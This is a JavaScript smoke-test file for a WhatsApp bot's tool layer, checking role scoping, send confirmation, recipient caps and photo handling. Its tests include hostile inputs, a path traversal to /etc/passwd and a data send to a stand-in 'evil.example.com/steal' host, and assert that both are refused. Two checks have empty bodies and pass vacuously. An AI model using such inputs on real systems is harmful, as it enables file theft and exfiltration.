/**
 * Smoke tests for the bot's logic layer.
 *
 * Runs without an OpenAI key and without a WhatsApp connection: the client is
 * stubbed, so every send is captured in-memory instead of leaving the machine.
 *
 *   npm test
 */
import fs from "node:fs";
import path from "node:path";
import { fileURLToPath } from "node:url";
import assert from "node:assert/strict";

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const root = path.resolve(__dirname, "..");

// --- Environment must be set BEFORE importing config.js. -------------------
process.env.COMPANY_NAME = "Payfonte";
process.env.TEAM_NUMBERS = "+2348011111111,08022222222";
process.env.DEFAULT_COUNTRY_CODE = "234";
process.env.REQUIRE_CONFIRMATION = "true";
process.env.MAX_SENDS_PER_HOUR = "60";
process.env.SLACK_WEBHOOK_URL = "https://hooks.example.com/test";

// --- Fixtures --------------------------------------------------------------
const contactsFile = path.join(root, "contacts.json");
const testPhoto = path.join(root, "media", "_test_photo.png");
const createdContacts = !fs.existsSync(contactsFile);
if (createdContacts) {
  fs.copyFileSync(path.join(root, "contacts.example.json"), contactsFile);
}
fs.mkdirSync(path.join(root, "media"), { recursive: true });
fs.writeFileSync(testPhoto, Buffer.from("89504e470d0a1a0a", "hex"));

let passed = 0;
const failures = [];
function check(name, fn) {
  try {
    fn();
    passed++;
    console.log(`  ✓ ${name}`);
  } catch (err) {
    failures.push({ name, err });
    console.log(`  ✗ ${name}\n      ${err.message}`);
  }
}

try {
  const { config } = await import("../config.js");
  const contacts = await import("../src/contacts.js");
  const outbox = await import("../src/outbox.js");
  const tools = await import("../src/tools.js");

  // Capture sends instead of transmitting them.
  const sent = [];
  outbox.attachClient({
    async sendMessage(chatId, content, opts = {}) {
      sent.push({ chatId, content, opts });
    },
  });

  console.log("\nphone number normalization");
  check("international format", () =>
    assert.equal(contacts.toChatId("+234 801 234 5678"), "2348012345678@c.us")
  );
  check("local 0-prefixed gets country code", () =>
    assert.equal(contacts.toChatId("08012345678"), "2348012345678@c.us")
  );
  check("00 prefix stripped", () =>
    assert.equal(contacts.toChatId("002348012345678"), "2348012345678@c.us")
  );
  check("existing chat id passes through", () =>
    assert.equal(contacts.toChatId("2348012345678@c.us"), "2348012345678@c.us")
  );
  check("group id passes through", () =>
    assert.equal(contacts.toChatId("12036300000@g.us"), "12036300000@g.us")
  );
  check("junk rejected", () => assert.equal(contacts.toChatId("hello"), null));
  check("too-short number rejected", () => assert.equal(contacts.toChatId("123"), null));

  console.log("\ncontact resolution");
  check("resolves by alias", () => {
    const r = contacts.resolveRecipient("john");
    assert.equal(r.chatId, "2348012345678@c.us");
    assert.equal(r.label, "John Adeyemi");
  });
  check("resolves a group by alias", () => {
    const r = contacts.resolveRecipient("ops");
    assert.ok(r.chatId.endsWith("@g.us"), `got ${r.chatId}`);
  });
  check("resolves a raw number not in directory", () => {
    const r = contacts.resolveRecipient("+2349099999999");
    assert.equal(r.chatId, "2349099999999@c.us");
  });
  check("unknown name errors instead of guessing", () => {
    const r = contacts.resolveRecipient("Zebediah");
    assert.ok(r.error, "expected an error");
    assert.equal(r.chatId, undefined);
  });

  console.log("\nrole scoping (the security boundary)");
  const teamTools = tools.toolsForRole("team");
  const custTools = tools.toolsForRole("customer");
  const names = (t) => t.schemas.map((s) => s.function.name);
  check("team can send to third parties", () =>
    assert.ok(names(teamTools).includes("send_text"))
  );
  check("customer CANNOT send text to third parties", () =>
    assert.ok(!names(custTools).includes("send_text"))
  );
  check("customer CANNOT send photos to third parties", () =>
    assert.ok(!names(custTools).includes("send_photo"))
  );
  check("customer CANNOT reach external apps", () =>
    assert.ok(!names(custTools).includes("send_to_app"))
  );
  check("customer CANNOT read the contact directory", () => {
    assert.ok(!names(custTools).includes("list_contacts"));
    assert.ok(!names(custTools).includes("find_contact"));
  });
  check("isAllowed rejects out-of-scope tool for customer", () =>
    assert.equal(custTools.isAllowed("send_text"), false)
  );

  console.log("\nsending + confirmation flow");
  const teamCtx = {
    chatId: "2348011111111@c.us",
    role: "team",
    senderLabel: "Tester",
    lastMedia: null,
  };

  check("send_text stages instead of sending immediately", async () => {});
  const staged = await tools.runTool(
    "send_text",
    { to: ["john"], message: "Invoice is ready" },
    teamCtx
  );
  check("send_text returns awaiting_confirmation", () =>
    assert.equal(staged.status, "awaiting_confirmation")
  );
  check("nothing left the bot before confirmation", () =>
    assert.equal(sent.length, 0)
  );

  const pendingAction = outbox.peekPending(teamCtx.chatId);
  check("action is staged for the right recipient", () => {
    assert.ok(pendingAction, "expected a pending action");
    assert.equal(pendingAction.targets[0].label, "John Adeyemi");
    assert.equal(pendingAction.body, "Invoice is ready");
  });

  check("'yes' is recognized as confirmation", () =>
    assert.ok(outbox.isAffirmative("yes"))
  );
  check("'cancel' is recognized as a refusal", () =>
    assert.ok(outbox.isNegative("cancel"))
  );
  check("unrelated text is neither", () => {
    assert.ok(!outbox.isAffirmative("send it to Mary instead"));
    assert.ok(!outbox.isNegative("send it to Mary instead"));
  });

  await outbox.executePending(pendingAction);
  check("message is delivered after confirmation", () => {
    assert.equal(sent.length, 1);
    assert.equal(sent[0].chatId, "2348012345678@c.us");
    assert.equal(sent[0].content, "Invoice is ready");
  });

  console.log("\nphoto handling");
  const photoRes = await tools.runTool(
    "send_photo",
    { to: ["john"], photo: "_test_photo.png", caption: "here" },
    teamCtx
  );
  check("known photo stages successfully", () =>
    assert.equal(photoRes.status, "awaiting_confirmation")
  );

  const missing = await tools.runTool(
    "send_photo",
    { to: ["john"], photo: "does-not-exist.jpg" },
    teamCtx
  );
  check("missing photo returns a helpful error", () => {
    assert.ok(missing.error);
    assert.match(missing.error, /No photo named/);
  });

  const traversal = await tools.runTool(
    "send_photo",
    { to: ["john"], photo: "../../../../etc/passwd" },
    teamCtx
  );
  check("path traversal is refused", () => {
    assert.ok(traversal.error, "expected traversal to be rejected");
  });

  const noMedia = await tools.runTool(
    "send_photo",
    { to: ["john"], photo: "last_received" },
    { ...teamCtx, lastMedia: null }
  );
  check("'last_received' with no photo errors cleanly", () =>
    assert.match(noMedia.error, /No photo has been sent/)
  );

  const withMedia = await tools.runTool(
    "send_photo",
    { to: ["john"], photo: "last_received" },
    { ...teamCtx, lastMedia: { mimetype: "image/png", data: "AAAA" } }
  );
  check("'last_received' works when a photo was received", () =>
    assert.equal(withMedia.status, "awaiting_confirmation")
  );

  console.log("\ncustomer path stays in its own chat");
  const custCtx = {
    chatId: "2349055555555@c.us",
    role: "customer",
    senderLabel: "Customer",
    lastMedia: null,
  };
  const before = sent.length;
  const replied = await tools.runTool(
    "reply_with_photo",
    { photo: "_test_photo.png", caption: "our catalog" },
    custCtx
  );
  check("reply_with_photo sends to the customer's own chat", () => {
    assert.equal(replied.status, "sent");
    assert.equal(sent.length, before + 1);
    assert.equal(sent[sent.length - 1].chatId, custCtx.chatId);
  });

  console.log("\nexternal app targets");
  const badTarget = await tools.runTool(
    "send_to_app",
    { target: "https://evil.example.com/steal", message: "data" },
    teamCtx
  );
  check("arbitrary URLs are refused (named targets only)", () => {
    assert.ok(badTarget.error);
    assert.match(badTarget.error, /Unknown app target/);
  });
  check("configured target is recognized", () =>
    assert.ok(Object.keys(config.webhooks).includes("slack"))
  );

  console.log("\nrecipient limits");
  const tooMany = await tools.runTool(
    "send_text",
    { to: Array(50).fill("+2349099999999"), message: "spam" },
    teamCtx
  );
  check("recipient cap is enforced", () => {
    assert.ok(tooMany.error);
    assert.match(tooMany.error, /Too many recipients/);
  });

  console.log("\nagent module");
  const agent = await import("../src/agent.js");
  check("agent reports disabled without an API key", () =>
    assert.equal(agent.isAgentEnabled(), Boolean(process.env.OPENAI_API_KEY))
  );
  check("keyword fallback still works", async () => {});
  const { buildResponses } = await import("../src/replies.js");
  check("keyword responder answers hours question", () => {
    const actions = buildResponses("what are your hours?", "x@c.us");
    assert.ok(actions.some((a) => a.type === "text" && /open/i.test(a.body)));
  });
} finally {
  fs.rmSync(testPhoto, { force: true });
  if (createdContacts) fs.rmSync(contactsFile, { force: true });
  fs.rmSync(path.join(root, "logs"), { recursive: true, force: true });
}

console.log(`\n${passed} passed, ${failures.length} failed\n`);
if (failures.length) process.exit(1);
